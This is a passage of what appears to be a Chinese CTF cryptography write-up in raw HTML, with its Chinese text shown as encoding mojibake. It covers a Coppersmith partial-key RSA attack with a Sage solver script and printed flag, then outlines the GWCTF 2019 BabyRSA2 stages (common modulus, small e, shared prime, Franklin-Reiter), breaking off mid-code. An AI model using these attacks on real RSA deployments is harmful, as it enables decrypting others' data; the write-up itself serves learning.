mathnormal">p</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.33610799999999996em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.46528em;vertical-align:0em;"></span><span class="mord mathnormal">n</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1.1555469999999999em;vertical-align:-0.2914389999999999em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-2.408561em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight" style="margin-right:0.01968em;">l</span></span></span><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">âˆ’</span><span class="mord mtight">1</span></span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.2914389999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord">2</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.8641079999999999em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">2</span><span class="mord mtight">6</span><span class="mord mtight">5</span></span></span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>æˆ‘ä»¬ä¹Ÿå¯ä»¥çŸ¥é“pçš„ä½265ä½ï¼Œè¿™æ ·æˆ‘ä»¬å°±çŸ¥é“pçš„565ä½ï¼Œè¿˜æœ‰459ä½æœªçŸ¥ï¼Œæ— æ³•ç›´æ¥ç”¨coppersmithæ±‚è§£ï¼Œåªæœ‰454æœªçŸ¥æ—¶æˆ‘ä»¬æ‰å¯ä»¥æ±‚è§£ï¼ˆå…·ä½“åŸç†å¯ä»¥çœ‹ä¸Šé¢é‚£ç¯‡æ–‡ç« ï¼‰ï¼Œæ‰€ä»¥è¿˜æœ‰5ä½æœªçŸ¥ï¼Œæˆ‘ä»¬å¯ä»¥çˆ†ç ´ä¸€ä¸‹</p><h2 id="exp-20"><a class="markdownIt-Anchor" href="#exp-20"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment">#sage</span><br><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> *<br>hint1=<span class="hljs-number">1514296530850131082973956029074258536069144071110652176122006763622293335057110441067910479</span><br>hint2=<span class="hljs-number">40812438243894343296354573724131194431453023461572200856406939246297219541329623</span><br>n=<span class="hljs-number">21815431662065695412834116602474344081782093119269423403335882867255834302242945742413692949886248581138784199165404321893594820375775454774521554409598568793217997859258282700084148322905405227238617443766062207618899209593375881728671746850745598576485323702483634599597393910908142659231071532803602701147251570567032402848145462183405098097523810358199597631612616833723150146418889589492395974359466777040500971885443881359700735149623177757865032984744576285054725506299888069904106805731600019058631951255795316571242969336763938805465676269140733371287244624066632153110685509892188900004952700111937292221969</span><br>c=<span class="hljs-number">19073695285772829730103928222962723784199491145730661021332365516942301513989932980896145664842527253998170902799883262567366661277268801440634319694884564820420852947935710798269700777126717746701065483129644585829522353341718916661536894041337878440111845645200627940640539279744348235772441988748977191513786620459922039153862250137904894008551515928486867493608757307981955335488977402307933930592035163126858060189156114410872337004784951228340994743202032248681976932591575016798640429231399974090325134545852080425047146251781339862753527319093938929691759486362536986249207187765947926921267520150073408188188</span><br>e=<span class="hljs-number">65537</span><br><br>pl = n*invert(hint2, <span class="hljs-number">2</span>**<span class="hljs-number">265</span>) % <span class="hljs-number">2</span>**<span class="hljs-number">265</span><br>pbar = (hint1 &lt;&lt; <span class="hljs-number">724</span>) + pl<br>PR.&lt;x&gt; = PolynomialRing(Zmod(n))<br><br><span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>**<span class="hljs-number">5</span>):<br>    f = pbar + (x*<span class="hljs-number">2</span>**<span class="hljs-number">265</span>*<span class="hljs-number">2</span>**<span class="hljs-number">5</span>) + (i&lt;&lt;<span class="hljs-number">265</span>)<br>    f = f.monic()<br>    pp = f.small_roots(X=<span class="hljs-number">2</span>^<span class="hljs-number">454</span>, beta=<span class="hljs-number">0.4</span>)<br>    <span class="hljs-keyword">if</span> pp: <br>        <span class="hljs-keyword">break</span><br><br>p = <span class="hljs-built_in">int</span>(pbar + (pp[<span class="hljs-number">0</span>]*<span class="hljs-number">2</span>**<span class="hljs-number">265</span>*<span class="hljs-number">2</span>**<span class="hljs-number">5</span>) + (i&lt;&lt;<span class="hljs-number">265</span>))<br><span class="hljs-built_in">print</span>(long_to_bytes(<span class="hljs-built_in">int</span>(<span class="hljs-built_in">pow</span>(c, invert(e,p-<span class="hljs-number">1</span>), p))))<br><span class="hljs-comment">#b&#x27;flag&#123;ef5e1582-8116-4f61-b458-f793dc03f2ff&#125;&#x27;</span><br><span class="hljs-comment">#NSSCTF&#123;ef5e1582-8116-4f61-b458-f793dc03f2ff&#125;</span><br></code></pre></td></tr></table></figure><h1 id="gwctf-2019babyrsa2"><a class="markdownIt-Anchor" href="#gwctf-2019babyrsa2"></a> [GWCTF 2019]BabyRSA2</h1><h2 id="é¢˜ç›®-21"><a class="markdownIt-Anchor" href="#é¢˜ç›®-21"></a> é¢˜ç›®</h2><p>æ²¡æœ‰é¢˜ç›®ï¼Œnc</p><h2 id="åˆ†æ-21"><a class="markdownIt-Anchor" href="#åˆ†æ-21"></a> åˆ†æ</h2><p>åˆæ˜¯ä¸€ä¸ªå†™åˆ°ç–¯çš„é¢˜ç›®</p><p>è€Œä¸”ä¸èƒ½æ‰‹åŠ¨è¾“å…¥ï¼Œåªèƒ½å€ŸåŠ©pwntoolsæ¥ä¼ è¾“ï¼Œæ‰€ä»¥è¢«è¿«è¦å»æäº†ä¸€ä¸‹wslçš„sageç¯å¢ƒï¼Œè¿™æ ·å°±æ–¹ä¾¿è®¸å¤šäº†ï¼Œä¸‹é¢æ”¾å‡ ç¯‡æ•™ç¨‹ã€‚</p><p>wslçš„å®‰è£…ï¼š</p><p>(æåˆ°æœ€åä¸€æ­¥ç›´æ¥ç”¨Microsoft Storeå®‰è£…Ubuntu)</p><p><a href="https://blog.csdn.net/weixin_42029733/article/details/137734595">ã€WSLã€‘åœ¨WIN11å®‰è£…å¹¶ä½¿ç”¨Linuxå­ç³»ç»Ÿï¼ˆUbuntuï¼‰_wsl ubuntu-CSDNåšå®¢</a></p><p>sagemathç¯å¢ƒï¼š</p><p><a href="https://hasegawaazusa.github.io/sagemath-get-started.html#wslsagemath%E6%8E%A8%E8%8D%90">sagemath å…¥é—¨ç¬”è®° | ç‹¬å¥ã®å°å±‹ (hasegawaazusa.github.io)</a></p><p>æå®Œä¹‹åä½ åº”è¯¥èƒ½å¤Ÿåœ¨vscodeé‡Œè¿æ¥ä¸Šubuntuäº†ï¼Œå¹¶ä¸”å¯ä»¥æ‰§è¡Œsageä»£ç </p><p>å¯ä»¥å…ˆå°è¯•è¾“å…¥sageï¼Œè¿›å…¥sageç»ˆç«¯ï¼Œç„¶åpipå®‰è£…å¥½pwntoolså’ŒCryptoï¼ˆè¿™ä¸ªæˆ‘æ˜¯ç›´æ¥ä»æœ¬åœ°å¤åˆ¶è¿‡å»äº†ï¼‰</p><p><a href="https://blog.csdn.net/xiaojin21cen/article/details/109642940">python3æŠ¥é”™ï¼šModuleNotFoundError: No module named â€˜Cryptoâ€˜_modulenotfounderror: no module named 'cryptography-CSDNåšå®¢</a></p><p>ä¹‹åè¿è¡Œçš„è„šæœ¬ç›´æ¥åœ¨ç»ˆç«¯ä¸­è¾“å…¥ sage [filename].sage</p><p>æå®Œä¸Šé¢ä¹‹åå°±å¯ä»¥å¼€å§‹ï¼Œå»ºè®®ç›´æ¥ç…§ç€expå­¦ï¼Œåæ­£æˆ‘å¥½å¤šåŸç†éƒ½æ²¡ææ‡‚</p><p>é™¤äº†æœ€åä¸€ä¸ªï¼Œå…¶ä»–çš„méƒ½ä¸ç”¨è½¬æˆå­—èŠ‚</p><h3 id="ç¬¬ä¸€éƒ¨åˆ†-3"><a class="markdownIt-Anchor" href="#ç¬¬ä¸€éƒ¨åˆ†-3"></a> ç¬¬ä¸€éƒ¨åˆ†</h3><p>éœ€è¦çˆ†ç ´ä¸€ä¸‹hashï¼Œä¸€å…±éœ€è¦çˆ†ç ´5ä¸ªå­—ç¬¦ï¼Œæˆ‘æ˜¯çœ‹wpé‡Œæ‰çœ‹åˆ°å­—ç¬¦èŒƒå›´æ˜¯æ•°å­—å’Œå°å†™å­—æ¯ï¼Œæˆ‘ä¸€å¼€å§‹è¿˜ä»¥ä¸ºé¢˜ç›®ç»™çš„+lastæ˜¯åå…­è¿›åˆ¶ï¼ŒåŸç†å°±æ˜¯å­—ç¬¦</p><h3 id="ç¬¬äºŒéƒ¨åˆ†-3"><a class="markdownIt-Anchor" href="#ç¬¬äºŒéƒ¨åˆ†-3"></a> ç¬¬äºŒéƒ¨åˆ†</h3><p>æœ€ç®€å•çš„å…±æ¨¡æ”»å‡»</p><h3 id="ç¬¬ä¸‰éƒ¨åˆ†-3"><a class="markdownIt-Anchor" href="#ç¬¬ä¸‰éƒ¨åˆ†-3"></a> ç¬¬ä¸‰éƒ¨åˆ†</h3><p>å°eï¼Œç›´æ¥å¼€æ ¹</p><h3 id="ç¬¬å››éƒ¨åˆ†"><a class="markdownIt-Anchor" href="#ç¬¬å››éƒ¨åˆ†"></a> ç¬¬å››éƒ¨åˆ†</h3><p>pé«˜ä½æ”»å‡»ï¼Œç›´æ¥ä¸Šæ¨¡æ¿äº†</p><h3 id="ç¬¬äº”éƒ¨åˆ†"><a class="markdownIt-Anchor" href="#ç¬¬äº”éƒ¨åˆ†"></a> ç¬¬äº”éƒ¨åˆ†</h3><p>ï¼ˆæœ€åä¸¤éƒ¨åˆ†æˆ‘ç›´æ¥ä¸Šxennyå¸ˆå‚…çš„expäº†ï¼Œå·²ç»å†™ç–¯äº†ï¼Œä¸æƒ³çœ‹äº†ï¼‰</p><p>å…±äº«ç´ æ•°ï¼Œä½†æ˜¯é€†å…ƒä¸å­˜åœ¨ï¼Œå¯ä»¥æ±‚çš„<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>e</mi><mi>i</mi></msub><mo separator="true">,</mo><mi>Ï•</mi><mo stretchy="false">(</mo><msub><mi>n</mi><mo stretchy="false">)</mo></msub><mo>=</mo><mn>14</mn><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">gcd(e_i,\phi(n_)=14)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1.1052em;vertical-align:-0.3551999999999999em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">e</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31166399999999994em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mathnormal mtight">i</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord mathnormal">Ï•</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal">n</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.34480000000000005em;"><span style="top:-2.5198em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mclose mtight">)</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.3551999999999999em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mord">4</span><span class="mclose">)</span></span></span></span></p><p>æˆ‘ä»¬å¯ä»¥æ±‚å‡ºm<sup>14</sup>ä½†è¿™ä¸ªç›´æ¥æ— æ³•å¼€æ ¹</p><p>ä¹‹åæˆ‘ä»¬å‘ç°<span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML"><semantics><mrow><mi>g</mi><mi>c</mi><mi>d</mi><mo stretchy="false">(</mo><mn>7</mn><mo separator="true">,</mo><msub><mi>q</mi><mn>1</mn></msub><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">)</mo><mo>=</mo><mn>1</mn></mrow><annotation encoding="application/x-tex">gcd(7,q_1q_2)=1</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord mathnormal" style="margin-right:0.03588em;">g</span><span class="mord mathnormal">c</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord">7</span><span class="mpunct">,</span><span class="mspace" style="margin-right:0.16666666666666666em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">1</span></span></span></span>è¿™æ ·æˆ‘ä»¬å°±å¯ä»¥æ±‚å‡ºm<sup>2</sup></p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>d</mi><mn>3</mn></msub><mo>âˆ—</mo><mn>7</mn><mo>=</mo><mn>1</mn><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">(</mo><msub><mi>q</mi><mn>2</mn></msub><mo>âˆ’</mo><mn>1</mn><mo stretchy="false">)</mo><mo stretchy="false">)</mo><mspace linebreak="newline"></mspace><msub><mi>m</mi><mn>2</mn></msub><mo>=</mo><msup><mi>m</mi><mrow><mn>14</mn><mo>âˆ—</mo><msub><mi>d</mi><mn>3</mn></msub></mrow></msup><mspace width="1em"/><mi>m</mi><mi>o</mi><mi>d</mi><mo stretchy="false">(</mo><msub><mi>q</mi><mn>1</mn></msub><msub><mi>q</mi><mn>2</mn></msub><mo stretchy="false">)</mo></mrow><annotation encoding="application/x-tex">d_3*7=1\quad mod((q_1-1)(q_2-1))\\m_2=m^{14*d_3}\quad mod(q_1q_2)</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.84444em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ—</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.64444em;vertical-align:0em;"></span><span class="mord">7</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">âˆ’</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:1em;vertical-align:-0.25em;"></span><span class="mord">1</span><span class="mclose">)</span><span class="mclose">)</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.58056em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:0em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:1.149108em;vertical-align:-0.25em;"></span><span class="mord"><span class="mord mathnormal">m</span><span class="msupsub"><span class="vlist-t"><span class="vlist-r"><span class="vlist" style="height:0.899108em;"><span style="top:-3.113em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight"><span class="mord mtight">1</span><span class="mord mtight">4</span><span class="mbin mtight">âˆ—</span><span class="mord mtight"><span class="mord mathnormal mtight">d</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.31731428571428577em;"><span style="top:-2.357em;margin-left:0em;margin-right:0.07142857142857144em;"><span class="pstrut" style="height:2.5em;"></span><span class="sizing reset-size3 size1 mtight"><span class="mord mtight">3</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.143em;"><span></span></span></span></span></span></span></span></span></span></span></span></span></span></span><span class="mspace" style="margin-right:1em;"></span><span class="mord mathnormal">m</span><span class="mord mathnormal">o</span><span class="mord mathnormal">d</span><span class="mopen">(</span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.03588em;">q</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.03588em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mclose">)</span></span></span></span></span></p><p>ä¹‹åå¯¹m<sup>2</sup>å¼€æ ¹å°±è¡Œäº†</p><h3 id="ç¬¬å…­éƒ¨åˆ†"><a class="markdownIt-Anchor" href="#ç¬¬å…­éƒ¨åˆ†"></a> ç¬¬å…­éƒ¨åˆ†</h3><p>æ˜¯mçš„çº¿æ€§å¡«å……æ”»å‡»ï¼Œä½†æ˜¯ä¸çŸ¥é“å¡«å……å‚æ•°</p><p>æ ¹æ®expçœ‹ï¼Œåº”è¯¥æ˜¯</p><p class='katex-block'><span class="katex-display"><span class="katex"><span class="katex-mathml"><math xmlns="http://www.w3.org/1998/Math/MathML" display="block"><semantics><mrow><msub><mi>M</mi><mn>1</mn></msub><mo>=</mo><mi>m</mi><mspace linebreak="newline"></mspace><msub><mi>M</mi><mn>2</mn></msub><mo>=</mo><mi>m</mi><mo>+</mo><mi>r</mi></mrow><annotation encoding="application/x-tex">M_1=m\\M_2=m+r</annotation></semantics></math></span><span class="katex-html" aria-hidden="true"><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">1</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal">m</span></span><span class="mspace newline"></span><span class="base"><span class="strut" style="height:0.83333em;vertical-align:-0.15em;"></span><span class="mord"><span class="mord mathnormal" style="margin-right:0.10903em;">M</span><span class="msupsub"><span class="vlist-t vlist-t2"><span class="vlist-r"><span class="vlist" style="height:0.30110799999999993em;"><span style="top:-2.5500000000000003em;margin-left:-0.10903em;margin-right:0.05em;"><span class="pstrut" style="height:2.7em;"></span><span class="sizing reset-size6 size3 mtight"><span class="mord mtight">2</span></span></span></span><span class="vlist-s">â€‹</span></span><span class="vlist-r"><span class="vlist" style="height:0.15em;"><span></span></span></span></span></span></span><span class="mspace" style="margin-right:0.2777777777777778em;"></span><span class="mrel">=</span><span class="mspace" style="margin-right:0.2777777777777778em;"></span></span><span class="base"><span class="strut" style="height:0.66666em;vertical-align:-0.08333em;"></span><span class="mord mathnormal">m</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span><span class="mbin">+</span><span class="mspace" style="margin-right:0.2222222222222222em;"></span></span><span class="base"><span class="strut" style="height:0.43056em;vertical-align:0em;"></span><span class="mord mathnormal" style="margin-right:0.02778em;">r</span></span></span></span></span></p><p>æ‰¾äº†xennyå¸ˆå‚…expçš„æºç </p><p>å…ˆåˆ©ç”¨CoppersmithShortPadAttackæ±‚å‡ºå¡«å……çš„rï¼Œç„¶åå†åˆ©ç”¨franklinReiterå°±å¯ä»¥æ±‚è§£äº†</p><h2 id="exp-21"><a class="markdownIt-Anchor" href="#exp-21"></a> exp</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span 